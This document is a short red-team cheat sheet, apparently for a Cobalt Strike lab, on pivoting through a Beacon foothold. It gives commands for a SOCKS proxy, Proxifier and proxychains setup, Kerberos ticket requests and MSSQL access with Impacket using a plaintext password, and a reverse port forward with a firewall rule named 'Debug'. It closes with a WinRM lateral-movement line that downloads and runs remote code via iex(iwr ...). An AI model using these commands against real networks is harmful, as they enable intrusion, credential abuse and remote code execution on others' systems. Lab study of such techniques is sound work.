
Add manual DNS entries
```powershell
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '10.10.120.1 lon-dc-1'

Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '10.10.120.20 lon-db-1'
```

Start a socks proxy within Beacon
```powershell
socks 1080 socks5
```

##### Proxifier
1. Go **Profile** > **Proxy Servers** and add a new proxy server.
	- Address: `teamserver_ip`
	- Port: 1080
	- Protocol: Version 5
	- Use this proxy by default? -> No.
2. Go **Profile** > **Proxification Rules** and add the following rule
	- Name: Beacon
	- Applications: Any
	- Target hosts: 10.10.120.0/23
	- Target ports: Any
	- Action: Proxy SOCKS5 10.0.0.5

##### Proxychains

Edit `/etc/proxychains.conf` accordingly
```powershell
socks5 [teamserver_ip] 1080
```

Use proxychains to requests tickets and perform attacks
```bash
proxychains getTGT.py 'CONTOSO.COM/rsteel:Passw0rd!' -dc-ip 10.10.120.1

proxychains mssqlclient.py contoso.com/rsteel@lon-db-1 -windows-auth -no-pass -k -dc-ip 10.10.120.1
```

---

##### Reverse Port Forward

Create port forward on foothold machine
```powershell
rportfwd 28190 localhost 80

run netsh advfirewall firewall add rule name="Debug" dir=in action=allow protocol=TCP localport=28190
```

Perform lateral movement
```powershell
remote-exec winrm lon-ws-1 iex(iwr http://lon-wkstn-1:28190/test -useb)
```